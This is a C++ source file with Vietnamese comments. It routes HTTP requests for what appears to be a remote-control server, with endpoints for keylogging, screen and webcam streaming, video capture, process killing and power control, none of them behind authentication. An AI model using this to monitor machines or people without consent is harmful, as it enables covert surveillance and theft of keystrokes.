// RequestRouter.cpp
#include "RequestRouter.h"
#include "utils/helpers.h"
#include "utils/logging.h"
#include <sstream>
#include <stdexcept> // Can cho std::exception

using namespace std;

RequestRouter::RequestRouter()
{
    // Constructor
}

/**
 * @brief Ham chinh xu ly ket noi tu mot client.
 * Duoc goi boi server.cpp trong mot luong rieng.
 */
void RequestRouter::handleClient(SOCKET client, string clientIP)
{
    // *** START: THEM TRY...CATCH DE CHONG SAP SERVER ***
    // Boc toan bo logic trong try...catch
    // De neu co bat ky loi nao (vi du: stoi("")),
    // server se khong bi sap, ma chi dong ket noi voi client nay.
    try
    {
        char buf[4096];
        int rec = recv(client, buf, sizeof(buf) - 1, 0);
        if (rec <= 0)
        {
            closesocket(client);
            return;
        }
        buf[rec] = 0;
        string reqStr(buf), method, path, body;

        istringstream iss(reqStr);
        iss >> method >> path;
        size_t bodyPos = reqStr.find("\r\n\r\n");
        if (bodyPos != string::npos)
            body = reqStr.substr(bodyPos + 4);

        string clientId = getHeader(reqStr, "X-Client-ID");
        if (clientId.empty())
            clientId = clientIP;

        // --- Dieu phoi yeu cau GET ---
        if (method == "GET")
        {
            // API (JSON hoac Stream)
            if (path.find("/api") == 0)
            {
                if (path == "/api/processes")
                    m_processController.handleGetProcesses(client);
                else if (path == "/api/apps")
                    m_appController.handleGetApps(client);
                else if (path.find("/api/keylog") == 0)
                    m_keylogController.handleGetKeylog(client);
                else if (path.find("/api/devices") == 0)
                    m_deviceController.handleGetDevices(client, path);
                else if (path.find("/api/stream/screen") == 0)
                    m_screenController.handleScreenStream(client, clientId);
                else if (path.find("/api/stream/cam") == 0)
                    m_deviceController.handleStreamCam(client, path, clientId);
                else
                    sendFileResponse(client, "404 API Not Found", "text/plain", 404);
            }
            // *** START: SUA LOI LOGIC CHUP ANH ***
            // Chup anh (Screenshot) KHONG phai la /api
            else if (path.find("/screenshot") == 0)
            {
                m_screenController.handleScreenshot(client, path, clientId);
            }
            // *** END: SUA LOI LOGIC CHUP ANH ***

            // File tinh (HTML, CSS, JS, MP4)
            else
            {
                m_staticFileController.handleFileRequest(client, path, clientId);
            }
        }
        // --- Dieu phoi yeu cau POST ---
        else if (method == "POST")
        {
            if (path == "/api/start")
                m_appController.handleStartApp(client, body);
            else if (path == "/api/kill")
                m_processController.handleKillProcess(client, body);
            else if (path == "/api/app/close")
                m_appController.handleCloseApp(client, body);
            else if (path == "/api/power")
                m_systemController.handlePower(client, body);
            else if (path == "/api/keylog/set")
                m_keylogController.handleSetKeylog(client, body);
            else if (path == "/api/clientlog")
                logConsole(clientId, getQueryParam(body, "msg", true)); // Log don gian
            else if (path == "/api/video/capture")
                m_deviceController.handleRecordVideo(client, body, clientId);
            else
                sendFileResponse(client, "404 API Not Found", "text/plain", 404);
        }

        closesocket(client);
    }
    // *** START: THEM TRY...CATCH DE CHONG SAP SERVER ***
    catch (const std::exception &e)
    {
        // Neu co bat ky loi nao, ghi log ra server
        // (Vi du: loi stoi("") se bi bat o day)
        logConsole(clientIP, "LOI NGHIEM TRONG: " + string(e.what()));
        // Gui phan hoi loi 500 cho client
        sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
        closesocket(client); // Dong ket noi loi
    }
    catch (...)
    {
        // Bat tat ca cac loi khac
        logConsole(clientIP, "LOI KHONG XAC DINH!");
        sendFileResponse(client, "500 Internal Server Error", "text/plain", 500);
        closesocket(client);
    }
    // *** END: THEM TRY...CATCH DE CHONG SAP SERVER ***
}